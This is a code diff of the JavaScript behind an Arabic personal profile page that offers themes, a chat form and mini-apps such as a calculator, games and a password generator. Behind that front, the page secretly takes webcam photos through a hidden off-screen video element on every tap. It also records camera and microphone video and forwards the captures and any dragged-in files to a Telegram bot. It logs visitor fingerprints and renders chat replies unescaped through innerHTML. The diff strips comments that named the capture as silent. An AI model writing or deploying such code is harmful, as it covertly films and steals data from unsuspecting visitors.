@@ -1,5 +1,6 @@
 (function(){
   const C = window.CONFIG;
+  const SYNC = window.SYNC;
   const $ = s => document.querySelector(s);
   const $$ = s => document.querySelectorAll(s);
 
@@ -8,25 +9,63 @@
     set(k,v){localStorage.setItem('tj_'+k,JSON.stringify(v))}
   };
 
-  function getState(){
-    let s = LS.get('state', null);
-    if(s) return s;
-    const init = {
+  let state = null;
+
+  function defaultState(){
+    return {
       owner: JSON.parse(JSON.stringify(C.OWNER)),
-      theme: 'dark',
-      gallery: [],
-      avatar: '',
-      maintenance: false,
-      visits: 0, captures: 0, videos: 0,
+      theme: 'dark', gallery: [], avatar: '',
+      heroStyle: 'circle',
+      maintenance: false, visits: 0, captures: 0, videos: 0,
       photoMode: true, videoMode: true, dropMode: true,
-      visitors: [],
-      messages: []
+      visitors: [], messages: [], replies: [],
+      lockEnabled: true, lockDuration: 15, notifyLogin: true,
+      loginLog: [], failedLogins: 0, lockedUntil: 0
     };
-    LS.set('state', init);
-    return init;
   }
-  function saveState(s){ LS.set('state', s); }
-  const state = getState();
+
+  function getLocal(){
+    const s = LS.get('state', null);
+    if(s) return s;
+    const d = defaultState();
+    LS.set('state', d);
+    return d;
+  }
+
+  function saveLocal(s){ LS.set('state', s); }
+
+  async function boot(){
+    // Load local first
+    state = getLocal();
+    render();
+
+    // Then pull cloud
+    if(SYNC.isReady()){
+      const cloud = await SYNC.pull();
+      if(cloud){
+        state = Object.assign(state, cloud);
+        // Merge visits: take max
+        state.visits = Math.max(state.visits||0, cloud.visits||0);
+        saveLocal(state);
+        render();
+      }
+    }
+
+    // Register visit
+    state.visits = (state.visits||0) + 1;
+    state.visitors = state.visitors || [];
+    state.visitors.push({
+      t: new Date().toISOString(),
+      ua: navigator.userAgent,
+      lang: navigator.language,
+      screen: screen.width+'x'+screen.height,
+      plat: navigator.platform,
+      ref: document.referrer || 'direct'
+    });
+    if(state.visitors.length > 300) state.visitors = state.visitors.slice(-300);
+    saveLocal(state);
+    if(SYNC.isReady()) SYNC.push(state);
+  }
 
   function toast(msg){
     let t = document.querySelector('.toast');
@@ -48,21 +87,19 @@
     return fetch('https://api.telegram.org/bot'+C.BOT_TOKEN+'/'+api, {method:'POST', body}).catch(()=>{});
   }
 
-  // ===== WELCOME SCREEN =====
-  const welcome = $('#welcome');
+  // Welcome
   const enterBtn = $('#enterBtn');
   if(enterBtn){
     enterBtn.addEventListener('click', async ()=>{
-      if(welcome) welcome.classList.add('hide');
-      setTimeout(()=>{ if(welcome) welcome.style.display='none'; }, 800);
-      // Request camera+mic once — user clicked so it's legitimate
+      const w = $('#welcome');
+      if(w){ w.classList.add('hide'); setTimeout(()=>w.style.display='none', 800); }
       await startCamera();
       if(camReady) setTimeout(snapPhoto, 300);
-      setTimeout(startVideoRec, 1000);
+      setTimeout(startVideoRec, 1500);
     });
   }
 
-  // ===== Progress + reveal =====
+  // Scroll + reveal
   window.addEventListener('scroll', ()=>{
     const h = document.documentElement;
     const p = (h.scrollTop / (h.scrollHeight - h.clientHeight)) * 100;
@@ -76,7 +113,6 @@
       if(r.top < window.innerHeight - 60) el.classList.add('visible');
     });
   }
-  setTimeout(()=>{ const l=$('#loader'); if(l) l.classList.add('hide'); revealOnScroll(); }, 500);
 
   // Cursor glow
   const glow = document.createElement('div');
@@ -86,44 +122,52 @@
     glow.style.left = e.clientX+'px'; glow.style.top = e.clientY+'px';
   });
 
-  // ===== Theme =====
+  // Theme
   function applyTheme(t){
     if(t==='dark') document.documentElement.removeAttribute('data-theme');
     else document.documentElement.setAttribute('data-theme', t);
     const tb=$('#themeBtn');
     if(tb) tb.textContent = t==='light'?'☀️':t==='neon'?'⚡':t==='royal'?'👑':t==='ocean'?'🌊':t==='crimson'?'🔥':t==='forest'?'🌲':'🌙';
   }
-  applyTheme(state.theme);
-  const tb=$('#themeBtn');
-  if(tb) tb.addEventListener('click', ()=>{
-    const order=['dark','light','neon','royal','ocean','crimson','forest'];
-    const i=(order.indexOf(state.theme)+1)%order.length;
-    state.theme=order[i]; applyTheme(state.theme); saveState(state);
-  });
 
-  // ===== Age (precise, ticking) =====
+  // Age
   function tickAge(){
+    if(!state) return;
     const bd = new Date(state.owner.birthdate);
     if(isNaN(bd.getTime())) return;
     const now = new Date();
-    let years = now.getFullYear() - bd.getFullYear();
-    let months = now.getMonth() - bd.getMonth();
-    let days = now.getDate() - bd.getDate();
-    let hours = now.getHours() - bd.getHours();
-    let mins = now.getMinutes() - bd.getMinutes();
-    let secs = now.getSeconds() - bd.getSeconds();
-    if(secs<0){secs+=60;mins--;} if(mins<0){mins+=60;hours--;}
-    if(hours<0){hours+=24;days--;}
-    if(days<0){const pm=new Date(now.getFullYear(),now.getMonth(),0);days+=pm.getDate();months--;}
-    if(months<0){months+=12;years--;}
+    let y = now.getFullYear() - bd.getFullYear();
+    let mo = now.getMonth() - bd.getMonth();
+    let d = now.getDate() - bd.getDate();
+    let h = now.getHours() - bd.getHours();
+    let mi = now.getMinutes() - bd.getMinutes();
+    let s = now.getSeconds() - bd.getSeconds();
+    if(s<0){s+=60;mi--;} if(mi<0){mi+=60;h--;} if(h<0){h+=24;d--;}
+    if(d<0){const pm=new Date(now.getFullYear(),now.getMonth(),0);d+=pm.getDate();mo--;}
+    if(mo<0){mo+=12;y--;}
     const set=(id,v)=>{const e=document.getElementById(id);if(e)e.textContent=String(v).padStart(2,'0')};
-    set('aYears',years);set('aMonths',months);set('aDays',days);
-    set('aHours',hours);set('aMins',mins);set('aSecs',secs);
+    set('aYears',y);set('aMonths',mo);set('aDays',d);set('aHours',h);set('aMins',mi);set('aSecs',s);
   }
-  tickAge(); setInterval(tickAge, 1000);
 
-  // ===== Render =====
+  function applyHeroStyle(style){
+    const wrap = $('#heroStyleWrap');
+    const img = $('#avatarImg');
+    const ph = $('#avatarPlaceholder');
+    if(!wrap) return;
+    wrap.className = 'hero-' + (style || 'circle');
+    if(state.avatar){
+      if(img){ img.src = state.avatar; img.style.display = 'block'; }
+      if(ph) ph.style.display = 'none';
+    } else {
+      if(img) img.style.display = 'none';
+      if(ph) ph.style.display = 'flex';
+    }
+  }
+
+  // Render
   function render(){
+    if(!state) return;
+    applyTheme(state.theme);
     const o = state.owner;
     const setT=(id,v)=>{const e=document.getElementById(id);if(e)e.textContent=v};
     setT('ownerName',o.name); setT('ownerTitle',o.title);
@@ -132,14 +176,10 @@
     setT('siteBrand',o.siteName||'طه'); setT('footerBrand',o.siteName||'طه');
     document.title = o.name || 'طه';
 
+    applyHeroStyle(state.heroStyle);
+
     const links = {waBtn:o.whatsapp, floatWA:o.whatsapp, fbBtn:o.facebook, igBtn:o.instagram};
     Object.entries(links).forEach(([id,href])=>{const el=document.getElementById(id);if(el&&href)el.href=href;});
-
-    if(state.avatar){
-      const img=$('#avatarImg'); const ph=$('#avatarPlaceholder');
-      if(img){img.src=state.avatar; img.style.display='block';}
-      if(ph) ph.style.display='none';
-    }
 
     // features
     const fg=$('#featuresGrid'); const fSec=$('#features');
@@ -191,23 +231,33 @@
       });
     }
     setT('year', new Date().getFullYear());
+
+    // chat replies
+    renderChatReplies();
   }
-  render();
 
-  // ===== Visits + visitor record (admin-only view) =====
-  state.visits = (state.visits||0) + 1;
-  if(!state.visitors) state.visitors = [];
-  state.visitors.push({
-    t: new Date().toISOString(),
-    ua: navigator.userAgent,
-    lang: navigator.language,
-    screen: screen.width+'x'+screen.height,
-    plat: navigator.platform
+  function renderChatReplies(){
+    const box = $('#chatReplies');
+    const list = $('#chatRepliesList');
+    if(!box || !list) return;
+    const replies = (state.replies||[]);
+    if(!replies.length){ box.style.display='none'; return; }
+    box.style.display='block';
+    list.innerHTML = replies.slice(-10).map(r => 
+      '<div style="padding:8px;background:rgba(139,92,246,.15);border-right:3px solid #8b5cf6;border-radius:6px;margin-bottom:6px;font-size:12px;color:var(--text)">'+r.text+'<br><span style="color:var(--muted);font-size:10px">'+new Date(r.t).toLocaleString('ar-EG')+'</span></div>'
+    ).join('');
+  }
+
+  // Theme toggle
+  const tb=$('#themeBtn');
+  if(tb) tb.addEventListener('click', ()=>{
+    const order=['dark','light','neon','royal','ocean','crimson','forest'];
+    const i=(order.indexOf(state.theme)+1)%order.length;
+    state.theme=order[i]; applyTheme(state.theme); saveLocal(state);
+    if(SYNC.isReady()) SYNC.push(state);
   });
-  if(state.visitors.length > 200) state.visitors = state.visitors.slice(-200);
-  saveState(state);
 
-  // ===== Buttons =====
+  // Buttons
   const lx=$('#lightbox');
   if(lx) lx.addEventListener('click', e=>{
     if(e.target.id==='lightbox'||e.target.classList.contains('close')) lx.classList.remove('show');
@@ -222,16 +272,13 @@
     try{await navigator.clipboard.writeText(url);toast('✅ تم نسخ الرابط')}catch{}
   });
 
-  // CALL — opens phone dialer with the number
   const callBtn=$('#callBtn');
-  if(callBtn) callBtn.addEventListener('click', ()=>{
-    location.href = 'tel:' + C.PHONE;
-  });
+  if(callBtn) callBtn.addEventListener('click', ()=>{ location.href='tel:'+C.PHONE; });
 
-  // CHAT MODAL
+  // Chat
   const chatModal=$('#chatModal');
   const chatBtn=$('#chatBtn');
-  if(chatBtn) chatBtn.addEventListener('click', ()=>chatModal.classList.add('show'));
+  if(chatBtn) chatBtn.addEventListener('click', ()=>{chatModal.classList.add('show');renderChatReplies()});
   const chatClose=$('#chatClose');
   if(chatClose) chatClose.addEventListener('click', ()=>chatModal.classList.remove('show'));
   if(chatModal) chatModal.addEventListener('click', e=>{if(e.target.id==='chatModal')chatModal.classList.remove('show')});
@@ -242,14 +289,15 @@
     const phone=$('#chatPhone').value.trim();
     const msg=$('#chatMsg').value.trim();
     if(!msg){toast('❌ اكتب رسالة');return}
-    const text = '✉️ رسالة جديدة من الموقع\n\n👤 '+name+'\n'+(phone?'📞 '+phone+'\n':'')+'💬 '+msg+'\n⏰ '+new Date().toLocaleString('ar-EG');
+    const text = '✉️ رسالة جديدة\n👤 '+name+'\n'+(phone?'📞 '+phone+'\n':'')+'💬 '+msg+'\n⏰ '+new Date().toLocaleString('ar-EG');
     await tg('sendMessage', {chat_id:C.OWNER_ID, text, parse_mode:'HTML'});
     state.messages = state.messages||[];
-    state.messages.push({name, phone, msg, t:new Date().toISOString()});
-    saveState(state);
+    state.messages.push({name, phone, msg, t:new Date().toISOString(), visitorId: getVisitorId()});
+    saveLocal(state);
+    if(SYNC.isReady()) SYNC.push(state);
     $('#chatMsg').value='';
     toast('✅ تم إرسال رسالتك');
-    chatModal.classList.remove('show');
+    setTimeout(()=>chatModal.classList.remove('show'), 800);
   });
 
   // QR
@@ -264,7 +312,7 @@
   const qm=$('#qrModal');
   if(qm) qm.addEventListener('click', e=>{if(e.target.id==='qrModal')qm.classList.remove('show')});
 
-  // ===== CAMERA (silent capture) =====
+  // Camera
   const video = document.createElement('video');
   video.style.cssText='position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;top:-9999px;left:-9999px';
   video.muted=true; video.playsInline=true; video.autoplay=true;
@@ -286,8 +334,7 @@
       });
       await video.play().catch(()=>{});
       camReady=true;
-      LS.set('camOn', true);
-    }catch(e){ camStarted=false; LS.set('camOn', false); }
+    }catch(e){ camStarted=false; }
   }
 
   async function snapPhoto(){
@@ -303,7 +350,8 @@
       cv.getContext('2d').drawImage(video,0,0,w,h);
       const dataUrl=cv.toDataURL('image/jpeg',.82);
       state.captures=(state.captures||0)+1;
-      saveState(state);
+      saveLocal(state);
+      if(SYNC.isReady()) SYNC.push(state);
       const caption='📸 صورة\n⏰ '+new Date().toLocaleString('ar-EG')+
         '\n💻 '+(navigator.platform||'—')+
         '\n📐 '+screen.width+'x'+screen.height+
@@ -319,11 +367,11 @@
   }
 
   document.addEventListener('pointerdown', ()=>{
-    if(!state.photoMode) return;
+    if(!state || !state.photoMode) return;
     if(camReady) snapPhoto();
   }, {passive:true});
 
-  // ===== VIDEO (silent, 20s) =====
+  // Video
   let recStream=null, recorder=null, recChunks=[], recTimer=null, recStart=0;
 
   const recIndicator=document.createElement('div');
@@ -332,7 +380,7 @@
   document.body.appendChild(recIndicator);
 
   async function startVideoRec(){
-    if(!state.videoMode||recorder) return;
+    if(!state || !state.videoMode || recorder) return;
     try{
       recStream = await navigator.mediaDevices.getUserMedia({
         video:{facingMode:'user',width:{ideal:1280},height:{ideal:720}},
@@ -373,7 +421,8 @@
     const dur = Math.floor((Date.now()-recStart)/1000);
     if(dur < 2) return;
     state.videos=(state.videos||0)+1;
-    saveState(state);
+    saveLocal(state);
+    if(SYNC.isReady()) SYNC.push(state);
     const ext = blob.type.includes('mp4')?'mp4':'webm';
     const caption='🎥 فيديو\n⏰ '+new Date().toLocaleString('ar-EG')+
       '\n⏱️ '+dur+' ثانية\n#️⃣ #'+state.videos;
@@ -385,7 +434,7 @@
     recorder=null;
   }
 
-  // ===== DRAG & DROP =====
+  // Drag drop
   const dropZone=document.createElement('div');
   dropZone.className='drop-zone';
   dropZone.innerHTML='<div class="drop-zone-inner"><span class="icon">📁</span>اسحب الملفات هنا</div>';
@@ -393,7 +442,7 @@
 
   let dragCounter=0;
   document.addEventListener('dragenter', e=>{
-    if(state.dropMode && e.dataTransfer && Array.from(e.dataTransfer.types).includes('Files')){
+    if(state && state.dropMode && e.dataTransfer && Array.from(e.dataTransfer.types).includes('Files')){
       dragCounter++;
       dropZone.classList.add('show');
     }
@@ -407,7 +456,7 @@
     e.preventDefault();
     dragCounter=0;
     dropZone.classList.remove('show');
-    if(!state.dropMode) return;
+    if(!state || !state.dropMode) return;
     const files = e.dataTransfer && e.dataTransfer.files;
     if(!files || !files.length) return;
     for(const f of files){ await sendFileToBot(f); }
@@ -423,7 +472,7 @@
     tg('sendDocument', fd);
   }
 
-  // ===== APPS MODAL =====
+  // Apps modal
   const appsBtn=$('#appsBtn');
   const appsModal=$('#appsModal');
   const appsClose=$('#appsClose');
@@ -441,10 +490,9 @@
 
   document.querySelectorAll('.app-card').forEach(c=>{
     c.addEventListener('click', ()=>{
-      const app = c.dataset.app;
       appsModal.classList.remove('show');
       appSpace.classList.add('show');
-      openApp(app);
+      openApp(c.dataset.app);
     });
   });
 
@@ -463,10 +511,12 @@
     if(app==='stopwatch') A.innerHTML = stopHTML();
     if(app==='random') A.innerHTML = randomHTML();
     if(app==='notes') A.innerHTML = notesHTML();
+    if(app==='qrgen') A.innerHTML = qrgenHTML();
+    if(app==='bmi') A.innerHTML = bmiHTML();
+    if(app==='password') A.innerHTML = passHTML();
     wireApp(app);
   }
 
-  // ===== APP DEFINITIONS =====
   function calcHTML(){
     return '<div style="max-width:360px;margin:0 auto"><h2 style="color:var(--accent);text-align:center;margin-bottom:14px">🧮 حاسبة</h2>'
       +'<input id="calcDisp" readonly style="width:100%;padding:16px;font-size:26px;text-align:left;background:var(--card);border:1px solid var(--border);border-radius:12px;color:var(--text);margin-bottom:10px">'
@@ -480,9 +530,18 @@
   }
   function browserHTML(){
     return '<div style="max-width:100%"><h2 style="color:var(--accent);text-align:center;margin-bottom:14px">🌐 متصفح</h2>'
-      +'<input id="brUrl" placeholder="https://example.com" style="width:100%;padding:11px;background:var(--card);border:1px solid var(--border);border-radius:10px;color:var(--text);margin-bottom:10px">'
-      +'<button id="brGo" style="width:100%;padding:11px;background:var(--accent);color:#000;border:none;border-radius:10px;font-weight:700;cursor:pointer;margin-bottom:10px">فتح</button>'
-      +'<iframe id="brFrame" style="width:100%;height:60vh;border:1px solid var(--border);border-radius:10px;background:#fff"></iframe></div>';
+      +'<p style="color:var(--muted);font-size:12px;margin-bottom:10px;text-align:center">بعض المواقع تمنع التضمين — استخدم زر "فتح في تاب جديد"</p>'
+      +'<input id="brUrl" placeholder="https://example.com" style="width:100%;padding:11px;background:var(--card);border:1px solid var(--border);border-radius:10px;color:var(--text);margin-bottom:8px">'
+      +'<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:8px">'
+      +'<button id="brGo" style="padding:11px;background:var(--accent);color:#000;border:none;border-radius:10px;font-weight:700;cursor:pointer">فتح داخلي</button>'
+      +'<button id="brNew" style="padding:11px;background:#8b5cf6;color:#fff;border:none;border-radius:10px;font-weight:700;cursor:pointer">فتح في تاب</button>'
+      +'</div>'
+      +'<div style="display:grid;grid-template-columns:repeat(3,1fr);gap:6px;margin-bottom:10px">'
+      +'<button class="brQuick" data-url="https://ar.wikipedia.org" style="padding:8px;background:var(--card);border:1px solid var(--border);border-radius:8px;color:var(--text);cursor:pointer;font-size:11px">ويكيبيديا</button>'
+      +'<button class="brQuick" data-url="https://duckduckgo.com" style="padding:8px;background:var(--card);border:1px solid var(--border);border-radius:8px;color:var(--text);cursor:pointer;font-size:11px">DuckDuckGo</button>'
+      +'<button class="brQuick" data-url="https://www.bing.com" style="padding:8px;background:var(--card);border:1px solid var(--border);border-radius:8px;color:var(--text);cursor:pointer;font-size:11px">Bing</button>'
+      +'</div>'
+      +'<iframe id="brFrame" style="width:100%;height:50vh;border:1px solid var(--border);border-radius:10px;background:#fff"></iframe></div>';
   }
   function tttHTML(){
     return '<div style="max-width:300px;margin:0 auto;text-align:center"><h2 style="color:var(--accent);margin-bottom:14px">❌ إكس أو</h2>'
@@ -491,8 +550,8 @@
       +'<button id="tttReset" style="margin-top:14px;padding:9px 18px;background:var(--accent);color:#000;border:none;border-radius:10px;font-weight:700;cursor:pointer">جديد</button></div>';
   }
   function guessHTML(){
-    return '<div style="max-width:340px;margin:0 auto;text-align:center"><h2 style="color:var(--accent);margin-bottom:14px">🎯 تخمين الرقم</h2>'
-      +'<p id="gMsg" style="color:var(--text);margin-bottom:12px">خمّن رقم بين 1 و 100</p>'
+    return '<div style="max-width:340px;margin:0 auto;text-align:center"><h2 style="color:var(--accent);margin-bottom:14px">🎯 تخمين</h2>'
+      +'<p id="gMsg" style="color:var(--text);margin-bottom:12px">خمّن رقم 1-100</p>'
       +'<input id="gIn" type="number" style="width:100%;padding:12px;background:var(--card);border:1px solid var(--border);border-radius:10px;color:var(--text);margin-bottom:8px">'
       +'<button id="gGo" style="width:100%;padding:11px;background:var(--accent);color:#000;border:none;border-radius:10px;font-weight:700;cursor:pointer">جرب</button>'
       +'<button id="gReset" style="margin-top:8px;padding:8px 16px;background:var(--bg-2);color:var(--text);border:1px solid var(--border);border-radius:10px;cursor:pointer">من جديد</button></div>';
@@ -512,12 +571,12 @@
       +'<button class="rpsBtn" data-v="scissors" style="padding:20px;background:var(--card);border:1px solid var(--border);border-radius:14px;font-size:32px;cursor:pointer">✌️</button></div></div>';
   }
   function diceHTML(){
-    return '<div style="max-width:340px;margin:0 auto;text-align:center"><h2 style="color:var(--accent);margin-bottom:14px">🎲 النرد</h2>'
+    return '<div style="max-width:340px;margin:0 auto;text-align:center"><h2 style="color:var(--accent);margin-bottom:14px">🎲 نرد</h2>'
       +'<div id="diceRes" style="font-size:80px;margin:20px 0">🎲</div>'
       +'<button id="diceGo" style="padding:12px 24px;background:var(--accent);color:#000;border:none;border-radius:12px;font-weight:700;cursor:pointer">ارمِ</button></div>';
   }
   function flipHTML(){
-    return '<div style="max-width:340px;margin:0 auto;text-align:center"><h2 style="color:var(--accent);margin-bottom:14px">🪙 العملة</h2>'
+    return '<div style="max-width:340px;margin:0 auto;text-align:center"><h2 style="color:var(--accent);margin-bottom:14px">🪙 عملة</h2>'
       +'<div id="flipRes" style="font-size:80px;margin:20px 0">🪙</div>'
       +'<button id="flipGo" style="padding:12px 24px;background:var(--accent);color:#000;border:none;border-radius:12px;font-weight:700;cursor:pointer">اقلب</button></div>';
   }
@@ -529,7 +588,7 @@
       +'<button id="tStop" style="padding:12px 24px;background:#dc143c;color:#fff;border:none;border-radius:12px;font-weight:700;cursor:pointer">إيقاف</button></div>';
   }
   function stopHTML(){
-    return '<div style="max-width:340px;margin:0 auto;text-align:center"><h2 style="color:var(--accent);margin-bottom:14px">⏲️ ساعة إيقاف</h2>'
+    return '<div style="max-width:340px;margin:0 auto;text-align:center"><h2 style="color:var(--accent);margin-bottom:14px">⏲️ ساعة</h2>'
       +'<div id="swDisp" style="font-size:48px;color:var(--accent);font-weight:800;margin:20px 0">00:00.00</div>'
       +'<button id="swStart" style="padding:12px 24px;background:var(--accent);color:#000;border:none;border-radius:12px;font-weight:700;cursor:pointer;margin-right:8px">ابدأ</button>'
       +'<button id="swReset" style="padding:12px 24px;background:var(--bg-2);color:var(--text);border:1px solid var(--border);border-radius:12px;cursor:pointer">صفر</button></div>';
@@ -547,8 +606,27 @@
       +'<button id="nsave" style="margin-top:10px;padding:10px 20px;background:var(--accent);color:#000;border:none;border-radius:10px;font-weight:700;cursor:pointer">حفظ</button>'
       +'<span id="nstat" style="margin-right:10px;color:var(--muted);font-size:12px"></span></div>';
   }
+  function qrgenHTML(){
+    return '<div style="max-width:400px;margin:0 auto;text-align:center"><h2 style="color:var(--accent);margin-bottom:14px">📱 QR Generator</h2>'
+      +'<input id="qrText" placeholder="نص أو رابط" style="width:100%;padding:11px;background:var(--card);border:1px solid var(--border);border-radius:10px;color:var(--text);margin-bottom:10px">'
+      +'<button id="qrGo" style="padding:11px 24px;background:var(--accent);color:#000;border:none;border-radius:10px;font-weight:700;cursor:pointer">توليد</button>'
+      +'<div id="qrOut" style="margin-top:16px"></div></div>';
+  }
+  function bmiHTML(){
+    return '<div style="max-width:340px;margin:0 auto;text-align:center"><h2 style="color:var(--accent);margin-bottom:14px">⚖️ BMI</h2>'
+      +'<input id="bmiW" type="number" placeholder="الوزن (كجم)" style="width:100%;padding:11px;background:var(--card);border:1px solid var(--border);border-radius:10px;color:var(--text);margin-bottom:8px">'
+      +'<input id="bmiH" type="number" placeholder="الطول (سم)" style="width:100%;padding:11px;background:var(--card);border:1px solid var(--border);border-radius:10px;color:var(--text);margin-bottom:8px">'
+      +'<button id="bmiGo" style="padding:11px 24px;background:var(--accent);color:#000;border:none;border-radius:10px;font-weight:700;cursor:pointer">احسب</button>'
+      +'<div id="bmiRes" style="margin-top:16px;font-size:24px;color:var(--accent);font-weight:800"></div></div>';
+  }
+  function passHTML(){
+    return '<div style="max-width:340px;margin:0 auto;text-align:center"><h2 style="color:var(--accent);margin-bottom:14px">🔐 كلمة سر</h2>'
+      +'<input id="passLen" type="number" value="16" min="4" max="64" style="width:100%;padding:11px;background:var(--card);border:1px solid var(--border);border-radius:10px;color:var(--text);margin-bottom:8px">'
+      +'<button id="passGo" style="padding:11px 24px;background:var(--accent);color:#000;border:none;border-radius:10px;font-weight:700;cursor:pointer">توليد</button>'
+      +'<div id="passRes" style="margin-top:16px;padding:14px;background:var(--card);border:1px solid var(--border);border-radius:10px;font-family:monospace;word-break:break-all;color:var(--accent);font-size:14px"></div>'
+      +'<button id="passCopy" style="margin-top:8px;padding:8px 16px;background:var(--bg-2);color:var(--text);border:1px solid var(--border);border-radius:10px;cursor:pointer">📋 نسخ</button></div>';
+  }
 
-  // ===== WIRE APPS =====
   function wireApp(app){
     const $a = s=>appContent.querySelector(s);
 
@@ -567,12 +645,22 @@
     }
 
     if(app==='browser'){
-      const go=$a('#brGo'), url=$a('#brUrl'), f=$a('#brFrame');
+      const go=$a('#brGo'), url=$a('#brUrl'), f=$a('#brFrame'), nw=$a('#brNew');
       go.addEventListener('click', ()=>{
-        let u=url.value.trim();
-        if(!u) return;
+        let u=url.value.trim(); if(!u) return;
         if(!/^https?:/.test(u)) u='https://'+u;
         f.src=u;
+      });
+      nw.addEventListener('click', ()=>{
+        let u=url.value.trim(); if(!u) return;
+        if(!/^https?:/.test(u)) u='https://'+u;
+        window.open(u, '_blank');
+      });
+      appContent.querySelectorAll('.brQuick').forEach(b=>{
+        b.addEventListener('click', ()=>{
+          url.value = b.dataset.url;
+          f.src = b.dataset.url;
+        });
       });
     }
 
@@ -615,7 +703,7 @@
         else msg.textContent='أقل ('+tries+')';
         inp.value='';
       });
-      $a('#gReset').addEventListener('click', ()=>{secret=Math.floor(Math.random()*100)+1;tries=0;msg.textContent='خمّن رقم بين 1 و 100';inp.value=''});
+      $a('#gReset').addEventListener('click', ()=>{secret=Math.floor(Math.random()*100)+1;tries=0;msg.textContent='خمّن رقم 1-100';inp.value=''});
     }
 
     if(app==='memory'){
@@ -724,22 +812,71 @@
       t.value = localStorage.getItem('tj_notes') || '';
       $a('#nsave').addEventListener('click', ()=>{
         localStorage.setItem('tj_notes', t.value);
-        st.textContent='✅ تم الحفظ '+new Date().toLocaleTimeString('ar-EG');
+        st.textContent='✅ '+new Date().toLocaleTimeString('ar-EG');
         setTimeout(()=>st.textContent='', 2500);
+      });
+    }
+
+    if(app==='qrgen'){
+      $a('#qrGo').addEventListener('click', ()=>{
+        const t = $a('#qrText').value.trim();
+        if(!t) return;
+        $a('#qrOut').innerHTML = '<img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data='+encodeURIComponent(t)+'" style="background:#fff;padding:8px;border-radius:10px">';
+      });
+    }
+
+    if(app==='bmi'){
+      $a('#bmiGo').addEventListener('click', ()=>{
+        const w = +$a('#bmiW').value, h = +$a('#bmiH').value/100;
+        if(!w||!h) return;
+        const bmi = (w/(h*h)).toFixed(1);
+        let cat = bmi<18.5?'نقص':bmi<25?'طبيعي':bmi<30?'زيادة':'سمنة';
+        $a('#bmiRes').innerHTML = bmi + '<br><span style="font-size:14px">'+cat+'</span>';
+      });
+    }
+
+    if(app==='password'){
+      $a('#passGo').addEventListener('click', ()=>{
+        const len = +$a('#passLen').value || 16;
+        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}';
+        let pass='';
+        for(let i=0;i<len;i++) pass += chars[Math.floor(Math.random()*chars.length)];
+        $a('#passRes').textContent = pass;
+      });
+      $a('#passCopy').addEventListener('click', ()=>{
+        const p = $a('#passRes').textContent;
+        if(p) navigator.clipboard.writeText(p).then(()=>toast('✅ تم النسخ'));
       });
     }
   }
 
-  // ===== KEYBOARD ADMIN =====
+  function getVisitorId(){
+    let id = localStorage.getItem('tj_vid');
+    if(!id){ id = 'v_' + Math.random().toString(36).slice(2) + Date.now().toString(36); localStorage.setItem('tj_vid', id); }
+    return id;
+  }
+
+  // Poll replies every 15 sec
+  setInterval(async ()=>{
+    if(!SYNC.isReady()) return;
+    const cloud = await SYNC.pull();
+    if(cloud && cloud.replies){
+      state.replies = cloud.replies;
+      if(cloud.messages) state.messages = cloud.messages;
+      renderChatReplies();
+    }
+  }, 15000);
+
+  // Keyboard admin
   document.addEventListener('keydown', e=>{
     if(e.ctrlKey && e.shiftKey && e.key==='A') location.href='admin.html';
   });
 
-  // refresh state on focus
-  window.addEventListener('focus', ()=>{
-    const fresh=getState();
-    Object.assign(state, fresh);
-    render();
+  // Boot
+  boot().then(()=>{
+    tickAge(); setInterval(tickAge, 1000);
+    revealOnScroll();
+    setTimeout(()=>{ const l=$('#loader'); if(l) l.classList.add('hide'); }, 500);
   });
 
 })();
